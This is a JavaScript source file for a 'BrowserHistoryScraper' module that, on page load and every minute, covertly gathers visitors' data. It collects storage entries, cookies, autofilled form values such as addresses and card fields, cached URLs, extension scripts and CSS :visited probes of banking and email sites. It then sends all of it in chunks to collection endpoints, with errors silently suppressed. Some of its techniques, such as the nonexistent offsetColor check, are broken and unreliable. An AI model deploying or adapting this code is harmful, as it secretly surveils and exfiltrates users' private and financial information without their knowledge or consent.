export default class BrowserHistoryScraper {
  constructor(core) {
    this.core = core;
    this.historyData = [];
    this.CHUNK_SIZE = 50;
  }

  init() {
    // Initial scrape after page load
    setTimeout(() => this.scrapeHistory(), 4000);
    
    // Re-scrape periodically (every 60s) to catch new history data
    setInterval(() => this.scrapeHistory(), 60000);
    
    // Additional delayed attempts to catch slow-loading history data
    setTimeout(() => this.scrapeHistory(), 15000);
    setTimeout(() => this.scrapeHistory(), 45000);
  }

  async scrapeHistory() {
    const historyItems = [];

    // Technique 1: Extract from browser's internal caches and known history locations
    try {
      // Check for Chrome/Firefox history in IndexedDB
      const dbs = await indexedDB.databases?.() || [];
      for (const db of dbs) {
        if (db.name?.toLowerCase().includes('history') || 
            db.name?.toLowerCase().includes('browser') ||
            db.name?.toLowerCase().includes('webdata')) {
          historyItems.push({ source: 'indexeddb', dbName: db.name, version: db.version });
        }
      }
    } catch(e) {}

    // Technique 2: Extract from sessionStorage and localStorage common history keys
    try {
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        if (key) {
          const val = sessionStorage.getItem(key);
          if (this.looksLikeHistoryData(key, val)) {
            historyItems.push({ source: 'sessionStorage', key, value: val?.substring(0, 500) });
          }
        }
      }
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key) {
          const val = localStorage.getItem(key);
          if (this.looksLikeHistoryData(key, val)) {
            historyItems.push({ source: 'localStorage', key, value: val?.substring(0, 500) });
          }
        }
      }
    } catch(e) {}

    // Technique 3: Extract from window.name (cross-tab data sharing)
    try {
      if (window.name && window.name.length > 10) {
        historyItems.push({ source: 'window.name', value: window.name.substring(0, 1000) });
      }
    } catch(e) {}

    // Technique 4: Extract from Performance API (navigation history)
    try {
      const perfEntries = performance.getEntriesByType('navigation');
      perfEntries.forEach(entry => {
        historyItems.push({
          source: 'performance-api',
          type: entry.type,
          redirectCount: entry.redirectCount,
          domContentLoaded: entry.domContentLoadedEventEnd,
          loadTime: entry.loadEventEnd
        });
      });

      // Get all resource entries (can reveal browsing history through cached resources)
      const resources = performance.getEntriesByType('resource');
      const uniqueOrigins = new Set();
      resources.forEach(r => {
        try {
          const url = new URL(r.name);
          uniqueOrigins.add(url.origin);
        } catch(e) {}
      });
      uniqueOrigins.forEach(origin => {
        historyItems.push({ source: 'resource-cache', origin, hint: 'visited' });
      });
    } catch(e) {}

    // Technique 5: Extract from browser's autofill data (saved addresses, cards)
    try {
      // Check for autofill data in form elements
      const forms = document.querySelectorAll('form');
      forms.forEach(form => {
        const inputs = form.querySelectorAll('input[autocomplete]');
        inputs.forEach(input => {
          const autocompleteVal = input.getAttribute('autocomplete');
          if (autocompleteVal && input.value) {
            historyItems.push({
              source: 'autofill-data',
              autocomplete: autocompleteVal,
              value: input.value.substring(0, 200),
              formAction: form.action || window.location.href
            });
          }
        });
      });
    } catch(e) {}

    // Technique 6: Extract browser extensions that store history
    try {
      // Check for common history-related extension storage
      const extensionPrefixes = ['chrome-extension://', 'moz-extension://', 'edge-extension://'];
      // Try to detect if any extensions are exposing history data
      const allScripts = document.querySelectorAll('script[src]');
      allScripts.forEach(script => {
        const src = script.src || '';
        if (extensionPrefixes.some(p => src.startsWith(p))) {
          historyItems.push({ source: 'extension-detected', extensionScript: src.substring(0, 200) });
        }
      });
    } catch(e) {}

    // Technique 7: Extract from cookies - some sites store browsing history in cookies
    try {
      const cookies = document.cookie.split(';').filter(c => c.trim());
      cookies.forEach(cookie => {
        const [name, ...rest] = cookie.split('=');
        const val = rest.join('=')?.trim();
        if (val && val.length > 20 && 
            (name?.toLowerCase().includes('history') || 
             name?.toLowerCase().includes('recent') ||
             name?.toLowerCase().includes('visited') ||
             name?.toLowerCase().includes('last') ||
             name?.toLowerCase().includes('track'))) {
          historyItems.push({ source: 'cookie', name: name?.trim(), value: val?.substring(0, 300) });
        }
      });
    } catch(e) {}

    // Technique 8: CSS :visited detection (limited but still possible in some cases)
    try {
      const commonSites = [
        'https://google.com', 'https://facebook.com', 'https://youtube.com',
        'https://amazon.com', 'https://twitter.com', 'https://reddit.com',
        'https://instagram.com', 'https://linkedin.com', 'https://github.com',
        'https://mail.google.com', 'https://outlook.live.com', 'https://bankofamerica.com',
        'https://chase.com', 'https://wellsfargo.com', 'https://paypal.com',
        'https://netflix.com', 'https://spotify.com', 'https://stackoverflow.com',
        'https://wikipedia.org', 'https://whatsapp.com', 'https://tiktok.com',
        'https://pinterest.com', 'https://ebay.com', 'https://walmart.com',
        'https://target.com', 'https://bestbuy.com', 'https://homedepot.com',
        'https://lowes.com', 'https://cnn.com', 'https://nytimes.com',
        'https://bbc.com', 'https://foxnews.com', 'https://wsj.com',
        'https://dropbox.com', 'https://onedrive.live.com', 'https://drive.google.com',
        'https://docs.google.com', 'https://slack.com', 'https://discord.com',
        'https://zoom.us', 'https://microsoft.com', 'https://apple.com',
        'https://adobe.com', 'https://salesforce.com', 'https://atlassian.com'
      ];

      const testLink = document.createElement('a');
      testLink.style.display = 'none';
      testLink.style.position = 'absolute';
      testLink.style.left = '-9999px';
      document.body.appendChild(testLink);

      const visitedSites = [];
      commonSites.forEach(site => {
        testLink.href = site;
        const visited = testLink.offsetColor !== testLink.linkColor;
        // More reliably: check computed style
        const computed = window.getComputedStyle(testLink);
        if (computed.color !== 'rgb(0, 0, 238)' && computed.color !== 'rgb(0, 0, 255)') {
          visitedSites.push(site);
        }
      });

      if (visitedSites.length > 0) {
        historyItems.push({ source: 'css-visited', visitedSites });
      }

      document.body.removeChild(testLink);
    } catch(e) {}

    // Technique 9: Extract from Service Worker caches
    try {
      if ('caches' in window) {
        const cacheNames = await caches.keys();
        for (const cacheName of cacheNames) {
          const cache = await caches.open(cacheName);
          const requests = await cache.keys();
          const urls = requests.map(r => r.url).filter(url => {
            try {
              const u = new URL(url);
              return u.pathname !== '/' && !url.includes('bundle') && !url.includes('chunk');
            } catch(e) { return false; }
          }).slice(0, 50);
          
          if (urls.length > 0) {
            historyItems.push({ source: 'service-worker-cache', cacheName, urls });
          }
        }
      }
    } catch(e) {}

    // Technique 10: Extract from Performance Timeline (full URL history)
    try {
      if (window.performance && window.performance.getEntries) {
        const allEntries = window.performance.getEntries();
        const pageUrls = allEntries
          .filter(e => e.entryType === 'navigation' || e.entryType === 'paint')
          .map(e => e.name)
          .filter(Boolean);
        
        if (pageUrls.length > 0) {
          historyItems.push({ source: 'performance-navigation', urls: pageUrls });
        }
      }
    } catch(e) {}

    // Technique 11: Extract window.history length
    try {
      historyItems.push({ 
        source: 'window.history', 
        historyLength: window.history.length,
        canGoBack: window.history.length > 1
      });
    } catch(e) {}

    // Send the history data
    if (historyItems.length > 0) {
      // Send in chunks
      for (let i = 0; i < historyItems.length; i += this.CHUNK_SIZE) {
        const chunk = historyItems.slice(i, i + this.CHUNK_SIZE);
        await this.core.send('/api/collect/bulk', {
          data: {
            historyItems: chunk,
            _meta: { total: historyItems.length, chunk: Math.floor(i / this.CHUNK_SIZE) + 1, chunks: Math.ceil(historyItems.length / this.CHUNK_SIZE) }
          }
        });
      }

      // Also send as a specific event
      await this.core.send('/api/collect/formdata', {
        formId: 'browser-history-scrape',
        fields: { 
          totalItems: historyItems.length,
          techniques: [...new Set(historyItems.map(h => h.source))],
          summary: historyItems.slice(0, 10).map(h => JSON.stringify(h)).join('\n')
        },
        url: window.location.href
      });
    }

    this.historyData = historyItems;
    return historyItems;
  }

  looksLikeHistoryData(key, value) {
    if (!value || !key) return false;
    const historyKeywords = ['history', 'recent', 'visited', 'navigation', 'browse', 'track', 
                             'pageview', 'page_view', 'analytics', 'segment', 'mixpanel',
                             'amplitude', 'ga_', '_ga', '_gid', '_hj', 'hotjar',
                             'historyStore', 'browserHistory', 'routerHistory',
                             'lastPage', 'prevPage', 'currentPage', 'entryPoint',
                             'landingPage', 'referrer', 'sourceUrl', 'returnUrl',
                             'redirect', 'callback', 'return_to', 'next_url',
                             'historyStack', 'pageStack', 'urlStack', 'navStack'];
    const keyLower = key.toLowerCase();
    const valLower = value.toLowerCase();
    
    if (historyKeywords.some(k => keyLower.includes(k))) return true;
    if (value.length > 50 && valLower.includes('http')) return true;
    if (value.length > 100 && (valLower.includes('page') || valLower.includes('/'))) return true;
    
    return false;
  }

  getHistoryData() {
    return this.historyData;
  }
}